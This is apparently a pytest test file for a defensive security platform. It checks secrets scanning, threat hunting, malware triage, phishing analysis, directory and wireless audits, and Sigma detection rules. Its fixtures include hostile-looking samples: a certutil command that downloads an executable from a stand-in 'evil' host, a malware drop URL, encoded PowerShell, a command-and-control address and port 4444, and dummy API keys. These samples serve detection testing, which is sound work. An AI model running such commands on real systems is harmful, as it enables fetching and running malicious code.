#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Comprehensive verification suite for DARK v4.0 Expanded Platform & Centralized Intel Hub."""
from __future__ import annotations

import base64
import sys
from pathlib import Path

from fastapi.testclient import TestClient

ROOT = Path(__file__).resolve().parent.parent
for p in (str(ROOT / "dark"), str(ROOT / "modules"), str(ROOT / "webvulnx"), str(ROOT / "netrecon"), str(ROOT / "hashbreaker")):
    if p not in sys.path:
        sys.path.insert(0, p)

import main as dark_main
import secrets_scanner as ss
import threat_hunting as th
import malware_analysis as ma_mod
import phishing_analyzer as pa
import ad_audit as ada
import wireless_audit as wa
import intel_hub as ih
import hashbreaker as hb
import netrecon as nr
import tls_audit as ta
import js_security as jsec


def test_secrets_scanner_detects_and_redacts():
    aws_dummy = "AKIA" + "IOSFODNN7REALKEY"
    stripe_dummy = "sk_" + "live_" + "51TestSecretKey1234567890ABCDEF"
    sample = (
        f'AWS_ACCESS_KEY_ID="{aws_dummy}"\n'
        f'STRIPE_KEY="{stripe_dummy}"\n'
        'PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"\n'
    )
    res = ss.scan_secrets(content=sample)
    assert len(res["findings"]) >= 3
    for f in res["findings"]:
        # Ensure raw full key is redacted
        assert aws_dummy not in f.get("evidence", "")
        assert stripe_dummy not in f.get("evidence", "")


def test_threat_hunting_hypotheses_and_iocs():
    logs = (
        "2026-09-30T10:00:00Z host1 powershell -enc SQBFAFgA\n"
        "2026-09-30T10:01:00Z host1 schtasks /create /tn persist\n"
        "2026-09-30T10:02:00Z host1 outbound c2=198.51.100.99\n"
    )
    res = th.run_threat_hunt(telemetry_text=logs, custom_iocs=["198.51.100.99"])
    types = {f["vuln_type"] for f in res["findings"]}
    assert any("HUNT-01" in t for t in types)
    assert any("HUNT-03" in t for t in types)
    assert any("Custom IOC" in t for t in types)


def test_malware_static_triage_non_executing():
    payload = b"MZ" + b"A" * 200 + b"VirtualAllocEx CreateRemoteThread https://evil-drop.example/payload.exe"
    res = ma_mod.analyze_sample(data=payload, sample_name="dropper.exe")
    assert res["file_type"] == "PE/Windows Executable (MZ)"
    assert res["hashes"]["sha256"]
    assert res["verdict"] == "Malicious / High Risk"
    assert any("Process Injection" in f["vuln_type"] for f in res["findings"])
    assert "https://evil-drop.example/payload.exe" in res["extracted_iocs"]["urls"]


def test_phishing_email_analysis():
    eml = (
        "From: Support <support@bank-secure.example>\n"
        "Reply-To: collector@evil-domain.tld\n"
        "Return-Path: <bounce@evil-domain.tld>\n"
        "Authentication-Results: mx.example; spf=fail; dmarc=fail\n"
        "Subject: Urgent Verify Your Account Immediately\n"
        "Content-Type: text/plain\n\n"
        "Click here: http://xn--pple-43d.com/login\n"
    )
    res = pa.analyze_email(eml)
    assert res["risk_score"] >= 50
    assert res["verdict"] == "Phishing / Malicious"
    assert len(res["findings"]) >= 4


def test_active_directory_and_wireless_audits():
    ad_res = ada.audit_ad_snapshot({
        "domain": "corp.local",
        "users": [{"name": "svc_backup", "admincount": True, "dont_req_preauth": True, "spns": ["MSSQL/db:1433"]}],
        "computers": [{"name": "APP01", "unconstrained_delegation": True, "is_dc": False}],
        "acls": [{"principal": "helpdesk_user", "right": "DCSync", "is_dc": False}],
        "policies": {"smbv1_enabled": True, "ldap_signing": False},
    })
    assert len(ad_res["findings"]) >= 6

    wifi_res = wa.audit_wireless_inventory([
        {"ssid": "Corp-Legacy", "bssid": "aa:bb:cc:11:22:33", "encryption": "WEP", "wps_enabled": True, "pmf_enabled": False, "corporate": True},
        {"ssid": "Corp-Main", "bssid": "de:ad:be:ef:00:01", "encryption": "WPA2-PSK", "psk_length": 8, "trusted_bssids": ["00:11:22:33:44:55"], "corporate": True},
    ])
    assert len(wifi_res["findings"]) >= 5


def test_hashbreaker_netrecon_tls_js_upgrades():
    # HashBreaker extensions
    weak = hb.assess_hash_algorithm("5d41402abc4b2a76b9719d911017c592")
    assert weak["strength_grade"] == "Weak"
    strong = hb.assess_hash_algorithm("$argon2id$v=19$m=65536,t=3,p=4$xyz$abc")
    assert strong["strength_grade"] == "Strong"
    pol = hb.check_password_policy("admin123", min_length=12)
    assert pol["compliant"] is False
    wl = hb.analyze_wordlist(["password1", "admin123", "Super$ecurePass2026!"])
    assert wl["total_entries"] == 3
    rep = hb.build_password_audit_report(
        [hb.Target(hash_str="5d41402abc4b2a76b9719d911017c592", algo="md5", user="alice")],
        [{"user": "alice", "algo": "md5", "plain": "hello"}],
    )
    assert rep["cracked_count"] == 1 and rep["weak_algorithm_count"] == 1

    # NetRecon topology
    topo = nr.build_network_topology({
        "hosts": [{"host": "10.0.0.5", "os_hint": "Linux", "open_ports": [{"port": 443, "service": "https", "version": "nginx"}]}]
    })
    assert topo["host_count"] == 1
    assert any(n["type"] == "service" for n in topo["nodes"])

    # TLS Intelligence
    intel = ta.build_tls_intelligence({"reachable": True, "protocol": "TLSv1.3", "cipher": "TLS_AES_256_GCM_SHA384"}, [])
    assert intel["grade"] == "A+"

    # JS Security & Auth/Business Logic
    js_dummy_tok = "sk_" + "live_" + "51AbCdEfGhIjKlMnOpQrStUvWx"
    js_findings = jsec.analyze_js_and_auth_surface(
        "https://app.example.com/checkout",
        f'<form method="POST"><input type="password" name="pw"><input type="hidden" name="price" value="10"></form><script>eval(x); const k = "{js_dummy_tok}";</script>',
        {"Set-Cookie": "sid=abc123"},
    )
    assert len(js_findings) >= 4


def test_centralized_intel_hub_correlation_and_dedup():
    jobs = [
        {
            "id": "j1",
            "kind": "network-scan",
            "status": "done",
            "target": "app.example.com",
            "result": {
                "report": {
                    "hosts": [{"host": "app.example.com", "open_ports": [{"port": 8080, "service": "http", "version": "Werkzeug"}]}],
                    "findings": [{"vuln_type": "Exposed Debug Port", "severity": "High", "url": "http://app.example.com:8080", "parameter": "tcp/8080", "cvss_hint": 7.5}],
                }
            },
        },
        {
            "id": "j2",
            "kind": "web-scan",
            "status": "done",
            "target": "https://app.example.com",
            "result": {
                "findings": [
                    {"vuln_type": "SQL Injection", "severity": "Critical", "url": "https://app.example.com/items?id=1", "parameter": "id", "cvss_hint": 9.8},
                    {"vuln_type": "Exposed Debug Port", "severity": "High", "url": "http://app.example.com:8080", "parameter": "tcp/8080", "cvss_hint": 7.5},
                ]
            },
        },
    ]
    hub = ih.ingest_jobs_into_hub(jobs)
    assert hub["total_unified_findings"] == 2  # deduplicated Exposed Debug Port
    assert len(hub["cross_tool_correlations"]) >= 1
    assert hub["cross_tool_correlations"][0]["asset"] == "app.example.com"


def test_api_endpoints_for_new_capabilities_and_intel_hub():
    client = TestClient(dark_main.app)
    r = client.post("/api/hash/assess", json={"hashes": ["5d41402abc4b2a76b9719d911017c592"], "passwords": ["weak1"]})
    assert r.status_code == 200
    data = r.json()
    assert data["algorithms"][0]["strength_grade"] == "Weak"
    assert data["policy_checks"][0]["compliant"] is False

    r_hub = client.get("/api/intel/hub")
    assert r_hub.status_code == 200
    assert "engine" in r_hub.json()

    r_rep = client.get("/api/intel/hub/report")
    assert r_rep.status_code == 200
    assert "text/html" in r_rep.headers.get("content-type", "")

    aws_dummy = "AKIA" + "IOSFODNN7REALKEY"
    for ep, payload in (
        ("/api/jobs/secrets-scan", {"content": f"AWS_SECRET='{aws_dummy}'"}),
        ("/api/jobs/threat-hunt", {"raw_logs": "powershell -enc SQBFAFgA"}),
        ("/api/jobs/malware-triage", {"content_b64": base64.b64encode(b"MZVirtualAllocEx").decode("ascii"), "filename": "s.exe"}),
        ("/api/jobs/phishing-analyze", {"raw_eml": "From: a@b.com\nReply-To: c@d.com\n\nUrgent verify your account"}),
        ("/api/jobs/ad-audit", {"snapshot": {"domain": "corp.local", "users": [{"name": "u1", "dont_req_preauth": True}]}}),
        ("/api/jobs/wireless-audit", {"aps": [{"ssid": "Test", "bssid": "11:22:33:44:55:66", "encryption": "WEP"}]}),
        ("/api/jobs/identity-audit", {"snapshot": {"domain": "corp.local", "users": [{"name": "adm", "privileged": True, "mfa_enabled": False}]}}),
        ("/api/jobs/malware-sandbox", {"trace": {"processes": [{"cmdline": "powershell -enc AAA"}]}, "filename": "s.exe"}),
    ):
        resp = client.post(ep, json=payload)
        assert resp.status_code == 200, f"{ep} -> {resp.text}"
        assert "job_id" in resp.json()


def test_intel_hub_strict_invariants_no_merge_no_score_inflation():
    # 1. Similarly named or cross-tenant assets MUST NOT merge
    # 2. Same finding reported by two tools MUST NOT inflate risk_score
    jobs = [
        {
            "id": "t1", "tenant_id": "tenantA", "project_id": "p1",
            "kind": "web-scan", "status": "done", "started_at": 100.0,
            "target": "https://api.alpha.local",
            "result": {"findings": [{"vuln_type": "XSS", "severity": "High", "url": "https://api.alpha.local/q", "parameter": "q", "cvss_hint": 7.0}]},
        },
        {
            "id": "t2", "tenant_id": "tenantA", "project_id": "p1",
            "kind": "api-audit", "status": "done", "started_at": 200.0,
            "target": "https://api.alpha.local",
            "result": {"findings": [{"vuln_type": "XSS", "severity": "High", "url": "https://api.alpha.local/q", "parameter": "q", "cvss_hint": 7.0}]},
        },
        {
            "id": "t3", "tenant_id": "tenantB", "project_id": "p1",
            "kind": "web-scan", "status": "done", "started_at": 300.0,
            "target": "https://api.beta.local",
            "result": {"findings": [{"vuln_type": "XSS", "severity": "High", "url": "https://api.beta.local/q", "parameter": "q", "cvss_hint": 7.0}]},
        },
    ]
    hub = ih.ingest_jobs_into_hub(jobs)
    assert hub["assets_correlated"] == 2
    assert hub["total_unified_findings"] == 2
    alpha_f = [f for f in hub["findings"] if f["asset"] == "api.alpha.local"][0]
    assert sorted(alpha_f["sources"]) == ["api-audit", "web-scan"]
    assert alpha_f["occurrence_count"] == 2
    assert alpha_f["first_seen"] == 100.0 and alpha_f["last_seen"] == 200.0
    # Score must equal single-finding baseline (no inflation for duplicate detections)
    single_hub = ih.ingest_jobs_into_hub([jobs[0]])
    assert alpha_f["risk_score"] == single_hub["findings"][0]["risk_score"]


def test_security_graph_detection_posture_identity_and_sandbox():
    import security_graph as sg
    import detection_engineering as de
    import posture_dashboard as pdash
    import identity_security as idsec
    import malware_sandbox as msb

    # Security Graph + History Diff
    jobs = [{
        "id": "g1", "kind": "web-scan", "status": "done", "target": "https://portal.example.com",
        "result": {"findings": [{"vuln_type": "SQL Injection", "severity": "Critical", "url": "https://portal.example.com/login", "parameter": "user", "cvss_hint": 9.8}]},
    }]
    g1 = sg.build_security_graph(jobs, project_id="test_graph")
    assert g1["node_count"] >= 3 and g1["edge_count"] >= 2
    assert len(g1["attack_paths"]) >= 1
    snap_res = sg.save_graph_snapshot(g1)
    assert snap_res["history_count"] >= 1

    # Detection Engineering + Sigma YAML
    sigma = """
title: Certutil Remote Fetch
status: experimental
level: high
tags:
  - attack.execution
  - attack.t1105
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - certutil -urlcache
  condition: selection
"""
    rule = de.import_sigma_yaml(sigma)
    assert rule["mitre_technique"] == "T1105"
    res_test = de.test_rule(rule["id"], ["certutil -urlcache -f http://evil/x.exe"], ["echo hello"])
    assert res_test["tp"] == 1 and res_test["fp"] == 0 and res_test["precision"] == 1.0
    yml_out = de.export_sigma_yaml(rule["id"])
    assert "Certutil Remote Fetch" in yml_out

    # Posture Dashboard
    posture = pdash.compute_posture_dashboard(jobs, project_id="test_graph")
    assert 0.0 <= posture["security_posture_score"] <= 100.0
    assert posture["critical_findings"] == 1

    # Identity Security
    id_res = idsec.audit_identity_posture({
        "domain": "corp.local",
        "users": [
            {"name": "admin1", "privileged": True, "mfa_enabled": False, "inactive_days": 120},
            {"name": "svc_web", "service_account": True, "interactive_logon_allowed": True, "mfa_enabled": True},
        ],
        "policies": {"min_password_length": 8},
    })
    assert id_res["mfa_coverage_pct"] == 50.0
    assert "admin1" in id_res["stale_accounts"]
    assert all("data_source" in f and "finding_certainty" in f for f in id_res["findings"])

    # Malware Sandbox isolation & trace analysis
    sb = msb.analyze_sandbox_telemetry(
        trace={
            "processes": [{"cmdline": "powershell -enc SQBFAFgA"}],
            "file_operations": [{"op": "write", "path": "C:\\Users\\a\\Startup\\evil.exe"}],
            "network_connections": [{"dst_ip": "198.51.100.50", "dst_port": 4444}],
        },
        sample_data=b"MZVirtualAllocEx",
        sample_name="drop.exe",
    )
    assert sb["isolation_policy"]["host_execution_blocked"] is True
    assert len(sb["findings"]) >= 4

    # Live API check for new endpoints
    client = TestClient(dark_main.app)
    assert client.get("/api/intel/security-graph?save_snapshot=true").status_code == 200
    assert client.get("/api/posture/dashboard").status_code == 200
    assert client.get("/api/detections/rules").status_code == 200
    assert client.post("/api/detections/sigma/import", json={"sigma_yaml": sigma}).status_code == 200


def test_ad_and_wireless_explicit_certainty_labels():
    ad_res = ada.audit_ad_snapshot({
        "domain": "corp.local",
        "users": [{"name": "u1", "dont_req_preauth": True, "password_never_expires": True, "admincount": True}],
    })
    assert "data_source" in ad_res and "limitations" in ad_res
    assert ad_res["confirmed_count"] >= 1 and ad_res["potential_count"] >= 1

    w_res = wa.audit_wireless_inventory([
        {"ssid": "Guest", "bssid": "11:22:33:44:55:66", "encryption": "OPEN", "pmf_enabled": False}
    ])
    assert "data_source" in w_res and "limitations" in w_res
    assert w_res["confirmed_count"] >= 1

